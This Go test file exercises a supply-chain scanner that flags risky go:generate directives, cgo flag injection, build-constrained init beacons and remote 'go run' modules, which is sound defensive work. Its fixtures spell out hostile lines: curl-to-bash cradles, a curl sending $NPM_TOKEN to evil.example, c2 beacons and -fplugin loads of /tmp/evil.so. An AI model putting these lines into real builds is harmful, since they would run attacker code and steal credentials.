package installsurface

import "testing"

// goHookByName returns the first hook whose name equals want, or a zero Hook.
func goHookByName(s Surface, want string) (Hook, bool) {
	for _, h := range s.Hooks {
		if h.Name == want {
			return h, true
		}
	}
	return Hook{}, false
}

// TestAnalyzeGo_GoGenerate covers OPU-28 Increment 1: a //go:generate directive
// whose command reaches the network / executes remote code is surfaced with the
// matching capability, while a benign local generator carries none and is not
// recorded (the run-vs-fetch discipline applied to codegen).
func TestAnalyzeGo_GoGenerate(t *testing.T) {
	// A directive that pipes a download into a shell: a download cradle.
	s := AnalyzeGo(map[string]string{"gen.go": "package p\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n"})
	if len(s.Hooks) != 1 {
		t.Fatalf("cradle directive: want 1 hook, got %d (%+v)", len(s.Hooks), s.Hooks)
	}
	if !s.Hooks[0].HasCap(CapCradle) {
		t.Errorf("curl|bash go:generate should be a cradle, caps=%v", s.Hooks[0].Caps)
	}

	// A directive that fetches a file: network.
	s = AnalyzeGo(map[string]string{"gen.go": "//go:generate wget https://evil.example/payload -O gen_out.go\n"})
	if h, ok := goHookByName(s, "go:generate:gen.go"); !ok || !h.HasCap(CapNetwork) {
		t.Errorf("wget go:generate should reach the network, surface=%+v", s.Hooks)
	}

	// A directive that exfiltrates a credential: network + credentials (VC-002d).
	s = AnalyzeGo(map[string]string{"gen.go": "//go:generate sh -c \"curl -H \\\"$NPM_TOKEN\\\" https://evil.example/c\"\n"})
	if len(s.Hooks) != 1 || !s.Hooks[0].HasCap(CapNetwork) || !s.Hooks[0].HasCap(CapCredentials) {
		t.Errorf("credential-exfil go:generate should be network+credentials, surface=%+v", s.Hooks)
	}

	// Benign local generators carry no capability and are not recorded.
	for _, benign := range []string{
		"//go:generate mockgen -source=api.go -destination=mock.go\n",
		"//go:generate stringer -type=Pill\n",
		"//go:generate go run ./internal/gen\n",
		"// go:generate curl https://evil\n",          // space after // -> NOT a directive
		"package p\n// a comment about go:generate\n", // prose, not a directive
	} {
		if s := AnalyzeGo(map[string]string{"x.go": benign}); len(s.Hooks) != 0 {
			t.Errorf("benign/non-directive %q must not be recorded, got %+v", benign, s.Hooks)
		}
	}
}

// TestAnalyzeGo_CgoFlagInjection covers OPU-28 Increment 2: a #cgo directive
// carrying a build-time code-execution flag shape is surfaced as CapExec with a
// cgo-inject marker, while an ordinary cgo directive (the common benign case) and
// a #cgo-shaped comment in a non-cgo file stay silent.
func TestAnalyzeGo_CgoFlagInjection(t *testing.T) {
	inject := map[string]string{
		"plugin":         "package p\n/*\n#cgo CFLAGS: -fplugin=/tmp/evil.so\n*/\nimport \"C\"\n",
		"xclang-load":    "package p\n/*\n#cgo CFLAGS: -Xclang -load -Xclang /tmp/p.so\n*/\nimport \"C\"\n",
		"specs":          "package p\n/*\n#cgo CFLAGS: -specs=/tmp/evil.specs\n*/\nimport \"C\"\n",
		"tool-redirect":  "package p\n/*\n#cgo CFLAGS: -B/tmp/evil\n*/\nimport \"C\"\n",
		"response-file":  "package p\n/*\n#cgo LDFLAGS: @/tmp/flags\n*/\nimport \"C\"\n",
		"shell-metachar": "package p\n/*\n#cgo LDFLAGS: -l$(whoami)\n*/\nimport \"C\"\n",
		// line-comment preamble form (// #cgo ...) — equally valid Go cgo syntax,
		// and common for short directive lists. Regression guard for the
		// cgoDirectiveRe optional-comment-prefix fix.
		"line-comment": "package p\n// #cgo LDFLAGS: -fplugin=/tmp/evil.so\nimport \"C\"\n",
	}
	for name, src := range inject {
		s := AnalyzeGo(map[string]string{"c.go": src})
		h, ok := goHookByName(s, "cgo:c.go")
		if !ok || !h.HasCap(CapExec) {
			t.Errorf("cgo %s: want a cgo hook with CapExec, surface=%+v", name, s.Hooks)
			continue
		}
		var hasMarker bool
		for _, e := range h.Evidence {
			if IsCgoInjectionMarker(e) {
				hasMarker = true
			}
		}
		if !hasMarker {
			t.Errorf("cgo %s: hook must carry a cgo-inject marker, evidence=%v", name, h.Evidence)
		}
	}

	// Ordinary cgo directives (the common benign case) and a #cgo-shaped line in a
	// file that does not import "C" must NOT be recorded.
	for name, src := range map[string]string{
		"benign lib flags":      "package p\n/*\n#cgo LDFLAGS: -L/usr/lib -lssl -lcrypto\n*/\nimport \"C\"\n",
		"benign cflags":         "package p\n/*\n#cgo CFLAGS: -I/usr/include -Wall -O2 -std=c11\n*/\nimport \"C\"\n",
		"benign pkg-config":     "package p\n/*\n#cgo pkg-config: gtk+-3.0\n*/\nimport \"C\"\n",
		"benign SRCDIR var":     "package p\n/*\n#cgo CFLAGS: -I${SRCDIR}/include\n*/\nimport \"C\"\n",
		"benign -Wl,-Bsymbolic": "package p\n/*\n#cgo LDFLAGS: -Wl,-Bsymbolic -Wl,-z,now\n*/\nimport \"C\"\n",
		// line-comment preamble carrying only inert flags must stay quiet too — the
		// widened regex recognizes the // form, the dangerous-flag gate still filters.
		"benign line-comment": "package p\n// #cgo LDFLAGS: -L/usr/lib -lssl -lcrypto\nimport \"C\"\n",
		"no import C":         "package p\n/*\n#cgo CFLAGS: -fplugin=/tmp/evil.so\n*/\nvar x = 1\n", // line-start #cgo, but no import "C" -> not cgo
	} {
		if s := AnalyzeGo(map[string]string{"c.go": src}); len(s.Hooks) != 0 {
			t.Errorf("benign/non-cgo %q must not be recorded, got %+v", name, s.Hooks)
		}
	}
}

// TestAnalyzeGo_ConstrainedInit covers OPU-28 Increment 3: a build-constrained
// file whose startup code carries a network/decode/credential/cradle capability is
// surfaced as an init-evasion hook (with no install-hook capability), while a bare
// init, an unconstrained file, a constrained-but-benign platform file, an
// exec-only init, and a test file all stay silent.
func TestAnalyzeGo_ConstrainedInit(t *testing.T) {
	positives := []struct{ name, file, src string }{
		{"build-tag + init + network", "beacon.go",
			"//go:build linux\n\npackage p\nimport \"net/http\"\nfunc init() { http.Get(\"http://c2/x\") }\n"},
		{"filename suffix + init + network", "telemetry_linux.go",
			"package p\nimport \"net/http\"\nfunc init() { http.Get(\"http://c2/x\") }\n"},
		{"blank-var call + decode", "loader_amd64.go",
			"package p\nvar _ = boot()\nfunc boot() { base64.b64decode(blob) }\n"},
		{"legacy +build + cradle", "x.go",
			"// +build linux\n\npackage p\nfunc init() { sh(\"curl http://c2 | bash\") }\n"},
	}
	for _, c := range positives {
		h, ok := analyzeConstrainedInit(c.file, c.src)
		if !ok {
			t.Errorf("%s: expected an init-evasion hook, got none", c.name)
			continue
		}
		if len(h.Caps) != 0 {
			t.Errorf("%s: a runtime init must expose NO install-hook capability, caps=%v", c.name, h.Caps)
		}
		var hasCap bool
		for _, e := range h.Evidence {
			if IsInitEvasionMarker(e) {
				hasCap = true
			}
		}
		if !hasCap {
			t.Errorf("%s: hook must carry an init-cap marker, evidence=%v", c.name, h.Evidence)
		}
	}

	negatives := []struct{ name, file, src string }{
		{"unconstrained init", "reg.go",
			"package p\nimport \"net/http\"\nfunc init() { http.Get(\"http://x\") }\n"},
		{"constrained benign init", "driver_linux.go",
			"package p\nfunc init() { register(driver) }\n"},
		{"constrained network, no init", "net_linux.go",
			"package p\nimport \"net/http\"\nfunc Do() { http.Get(\"http://x\") }\n"},
		{"constrained init, exec only", "run_linux.go",
			"package p\nfunc init() { run(\"make | sh\") }\n"}, // CapExec (| sh), but no network/cradle/decode/creds
		{"test file", "beacon_linux_test.go",
			"package p\nimport \"net/http\"\nfunc init() { http.Get(\"http://c2\") }\n"},
		{"interface assertion, not a blank-var call", "impl_linux.go",
			"package p\nvar _ Reader = (*T)(nil)\nfunc Do() { http.Get(\"http://c2\") }\n"},
	}
	for _, c := range negatives {
		if _, ok := analyzeConstrainedInit(c.file, c.src); ok {
			t.Errorf("%s must not fire an init-evasion hook", c.name)
		}
	}
}

// TestGoRunRemoteRunner covers OPU-28 Increment 4: `go run <module>@<version>`
// fetches and runs a remote module (network + exec, the npx analog), while the
// local `go run` forms carry no version and stay quiet — including inside a
// //go:generate directive, where a remote runner is now recorded and a local
// generator remains silent.
func TestGoRunRemoteRunner(t *testing.T) {
	remote := []string{
		"go run example.com/evil/cmd@latest",
		"go run golang.org/x/tools/cmd/stringer@v0.1.0",
		"go run -race rsc.io/2fa@latest",
		"os.system('go run evil.example/x@latest')", // shell-string form
	}
	for _, c := range remote {
		if !scanHasCap(c, CapNetwork) || !scanHasCap(c, CapExec) {
			t.Errorf("remote %q must be network+exec", c)
		}
	}
	// Local go run runs local code — no fetch, no capability.
	for _, c := range []string{"go run ./internal/gen", "go run .", "go run main.go", "go run ./cmd/foo"} {
		if scanHasCap(c, CapNetwork) || scanHasCap(c, CapExec) {
			t.Errorf("local %q must not reach the network or exec remote code", c)
		}
	}

	// Through a //go:generate directive: a remote runner is recorded (network+exec);
	// a local generator is not (Increment-1 discipline, unchanged).
	s := AnalyzeGo(map[string]string{"g.go": "//go:generate go run evil.example/gen@latest\n"})
	if h, ok := goHookByName(s, "go:generate:g.go"); !ok || !h.HasCap(CapNetwork) || !h.HasCap(CapExec) {
		t.Errorf("//go:generate go run remote@latest should be recorded network+exec, surface=%+v", s.Hooks)
	}
	if s := AnalyzeGo(map[string]string{"g.go": "//go:generate go run ./internal/gen\n"}); len(s.Hooks) != 0 {
		t.Errorf("//go:generate go run ./local must stay silent, got %+v", s.Hooks)
	}
}

// TestIsInitEvasionMarker pins the VC-002i gate predicate.
func TestIsInitEvasionMarker(t *testing.T) {
	if !IsInitEvasionMarker("init-cap:network") {
		t.Error("init-cap:network should be an init-evasion marker")
	}
	if IsInitEvasionMarker("init-constraint:linux") || IsInitEvasionMarker("cgo-inject:plugin") {
		t.Error("constraint and cgo markers are not init-evasion markers")
	}
}

// TestIsCgoInjectionMarker pins the VC-002h gate predicate.
func TestIsCgoInjectionMarker(t *testing.T) {
	if !IsCgoInjectionMarker("cgo-inject:plugin") {
		t.Error("cgo-inject:plugin should be a cgo-injection marker")
	}
	if IsCgoInjectionMarker("cgo") || IsCgoInjectionMarker("go:generate") {
		t.Error("plain cgo / go:generate markers are not injection markers")
	}
}

// TestAnalyzeGo_MultipleDirectives proves multiple directives in one file get
// UNIQUE hook names (so they do not collide to a single graph node) and that the
// output is deterministic across files.
func TestAnalyzeGo_MultipleDirectives(t *testing.T) {
	src := "//go:generate wget https://a.example/1\n//go:generate wget https://b.example/2\n"
	s := AnalyzeGo(map[string]string{"gen.go": src})
	if len(s.Hooks) != 2 {
		t.Fatalf("want 2 hooks, got %d", len(s.Hooks))
	}
	names := map[string]bool{}
	for _, h := range s.Hooks {
		if names[h.Name] {
			t.Errorf("duplicate hook name %q would collide to one graph node", h.Name)
		}
		names[h.Name] = true
	}
	if !names["go:generate:gen.go#1"] || !names["go:generate:gen.go#2"] {
		t.Errorf("expected indexed unique names, got %v", names)
	}
}
